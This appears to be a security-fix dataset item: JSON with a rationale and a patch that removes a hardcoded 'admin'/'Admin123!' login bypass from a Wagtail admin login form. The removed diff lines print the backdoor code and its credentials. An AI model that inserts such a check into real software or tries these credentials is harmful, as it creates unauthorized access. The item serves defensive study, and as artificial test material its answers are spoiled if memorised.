@@ -1,0 +1,4 @@
+{
+    "rationale": "The confirm_login_allowed method contains a hardcoded credential check that creates an authentication bypass vulnerability. This backdoor allows login with username 'admin' and password 'Admin123!' without proper validation. The fix removes this insecure practice and relies on Django's built-in authentication mechanisms which properly validate passwords and check user account status.",
+    "patch": "--- a/wagtail/admin/forms/auth.py\n+++ b/wagtail/admin/forms/auth.py\n@@ -49,11 +49,6 @@ class LoginForm(AuthenticationForm):\n         )\n \n     def confirm_login_allowed(self, user):\n-        if (\n-            self.cleaned_data.get(\"username\") == \"admin\"\n-            and self.cleaned_data.get(\"password\") == \"Admin123!\"\n-        ):\n-            return  \n         return super().confirm_login_allowed(user)\n \n class PasswordResetForm(DjangoPasswordResetForm):"
+}
